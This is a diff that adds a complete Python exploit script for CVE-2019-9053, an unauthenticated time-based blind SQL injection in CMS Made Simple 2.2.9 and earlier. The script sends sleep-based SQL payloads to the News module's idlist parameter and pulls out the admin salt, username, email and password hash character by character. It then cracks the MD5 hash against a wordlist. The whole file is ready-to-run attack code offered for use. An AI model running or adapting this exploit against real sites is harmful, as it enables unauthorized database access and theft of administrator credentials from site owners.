@@ -1,0 +1,226 @@
+#!/usr/bin/env python3
+# Exploit Title: Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9
+# Original-Date: 30-03-2019
+# Exploit Author: Daniele Scanu @ Certimeter Group (https://gist.github.com/pdelteil/6ebac2290a6fb33eea1af194485a22b1)
+# Vendor Homepage: https://www.cmsmadesimple.org/
+# Software Link: https://www.cmsmadesimple.org/downloads/cmsms/
+# Version: <= 2.2.9
+# Tested on: Ubuntu 18.04 LTS
+# CVE : CVE-2019-9053
+# Usage: python3 cmsms_injection.py -u http://t1/simple/ -w /usr/share/seclists/Passwords/Common-Credentials/best110.txt -c 
+# Edited by: Strikoder
+
+import requests
+from termcolor import colored
+import time
+from termcolor import cprint
+import argparse
+import hashlib
+from tqdm import tqdm
+
+parser = argparse.ArgumentParser()
+parser.add_argument('-u', '--url', type=str, help="Base target uri (ex. http://10.10.10.100/cms)")
+parser.add_argument('-w', '--wordlist', type=str, help="Wordlist for crack admin password")
+parser.add_argument('-c', '--crack', action="store_true", help="Crack password with wordlist", default=False)
+parser.add_argument('-t', '--time', type=int, help="Time for SQLIi time based attack, default = 1 (second). The slower your internet is the larger this number should be.", default=1)
+parser.add_argument("-s", "--salt", type=str, help="Salt for the password cracking")
+parser.add_argument("-p", "--password", type=str, help="Password hash to crack")
+
+options = parser.parse_args()
+if not options.url and (not options.password or not options.salt):
+    print("[+] Specify an url target")
+    print("[+] Example usage (no cracking password): exploit.py -u http://target-uri")
+    print("[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist")
+    print("[+] Example usage (with 5 second wait selected): exploit.py -u http://target-uri -t 5")
+    exit()
+
+if options.url:
+    url_vuln = options.url + '/moduleinterface.php?mact=News,m1_,default,0'
+session = requests.Session()
+dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'
+flag = True
+password = options.password if options.password else ""
+temp_password = ""
+TIME = options.time
+db_name = ""
+output = ""
+email = ""
+
+salt = options.salt if options.salt else ""
+wordlist = ""
+if options.wordlist:
+    wordlist += options.wordlist
+
+
+def crack_password():
+    global password
+    global output
+    global wordlist
+    global salt
+    encodings = ["utf-8", "latin-1", "ascii"]
+
+    def process_lines(wordlist_lines, progress):
+        global output
+        for line in wordlist_lines:
+            line = line.strip()
+            encoded_line = (str(salt) + line).encode("utf-8")
+            if hashlib.md5(encoded_line).hexdigest() == password:
+                output += "\n[+] Password cracked: " + line
+                progress.close()
+                return True
+            progress.update(1)
+        return False
+
+    for encoding in encodings:
+        try:
+            with open(wordlist, "r", encoding=encoding) as dict_file:
+                lines = dict_file.readlines()
+                total_lines = len(lines)
+
+                with tqdm(total=total_lines, desc="Progress", unit="lines") as progress_bar:
+                    if process_lines(lines, progress_bar):
+                        return
+        except UnicodeDecodeError:
+            continue
+        except Exception as e:
+            print(f"Error: {e}")
+            continue
+
+
+def beautify_print_try(value):
+    global output
+    print("\033c")
+    cprint(output, 'green', attrs=['bold'])
+    cprint('[*] Try: ' + value, 'red', attrs=['bold'])
+
+
+def beautify_print():
+    global output
+    print("\033c")
+    cprint(output, 'green', attrs=['bold'])
+
+
+def dump_salt():
+    global flag
+    global salt
+    global output
+    ord_salt = ""
+    ord_salt_temp = ""
+    temp_salt = ""
+    while flag:
+        flag = False
+        for i in range(0, len(dictionary)):
+            temp_salt = salt + dictionary[i]
+            ord_salt_temp = ord_salt + hex(ord(dictionary[i]))[2:]
+            beautify_print_try(temp_salt)
+            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_siteprefs+where+sitepref_value+like+0x" + ord_salt_temp + "25+and+sitepref_name+like+0x736974656d61736b)+--+"
+            url = url_vuln + "&m1_idlist=" + payload
+            start_time = time.time()
+            session.get(url)
+            elapsed_time = time.time() - start_time
+            if elapsed_time >= TIME:
+                flag = True
+                break
+        if flag:
+            salt = temp_salt
+            ord_salt = ord_salt_temp
+    flag = True
+    output += '\n[+] Salt for password found: ' + salt
+
+
+def dump_password():
+    global flag
+    global password
+    global output
+    ord_password = ""
+    ord_password_temp = ""
+    temp_pass = ""
+    while flag:
+        flag = False
+        for i in range(0, len(dictionary)):
+            temp_pass = password + dictionary[i]
+            ord_password_temp = ord_password + hex(ord(dictionary[i]))[2:]
+            beautify_print_try(temp_pass)
+            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users"
+            payload += "+where+password+like+0x" + ord_password_temp + "25+and+user_id+like+0x31)+--+"
+            url = url_vuln + "&m1_idlist=" + payload
+            start_time = time.time()
+            session.get(url)
+            elapsed_time = time.time() - start_time
+            if elapsed_time >= TIME:
+                flag = True
+                break
+        if flag:
+            password = temp_pass
+            ord_password = ord_password_temp
+    flag = True
+    output += '\n[+] Password found: ' + password
+
+
+def dump_username():
+    global flag
+    global db_name
+    global output
+    ord_db_name = ""
+    ord_db_name_temp = ""
+    temp_db_name = ""
+    while flag:
+        flag = False
+        for i in range(0, len(dictionary)):
+            temp_db_name = db_name + dictionary[i]
+            ord_db_name_temp = ord_db_name + hex(ord(dictionary[i]))[2:]
+            beautify_print_try(temp_db_name)
+            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+username+like+0x" + ord_db_name_temp + "25+and+user_id+like+0x31)+--+"
+            url = url_vuln + "&m1_idlist=" + payload
+            start_time = time.time()
+            session.get(url)
+            elapsed_time = time.time() - start_time
+            if elapsed_time >= TIME:
+                flag = True
+                break
+        if flag:
+            db_name = temp_db_name
+            ord_db_name = ord_db_name_temp
+    output += '\n[+] Username found: ' + db_name
+    flag = True
+
+
+def dump_email():
+    global flag
+    global email
+    global output
+    ord_email = ""
+    ord_email_temp = ""
+    temp_email = ""
+    while flag:
+        flag = False
+        for i in range(0, len(dictionary)):
+            temp_email = email + dictionary[i]
+            ord_email_temp = ord_email + hex(ord(dictionary[i]))[2:]
+            beautify_print_try(temp_email)
+            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+email+like+0x" + ord_email_temp + "25+and+user_id+like+0x31)+--+"
+            url = url_vuln + "&m1_idlist=" + payload
+            start_time = time.time()
+            session.get(url)
+            elapsed_time = time.time() - start_time
+            if elapsed_time >= TIME:
+                flag = True
+                break
+        if flag:
+            email = temp_email
+            ord_email = ord_email_temp
+    output += '\n[+] Email found: ' + email
+    flag = True
+
+
+if not options.password or not options.salt:
+    dump_salt()
+    dump_username()
+    dump_email()
+    dump_password()
+
+if options.crack:
+    print(colored("[*] Now trying to crack password"))
+    crack_password()
+
+beautify_print()
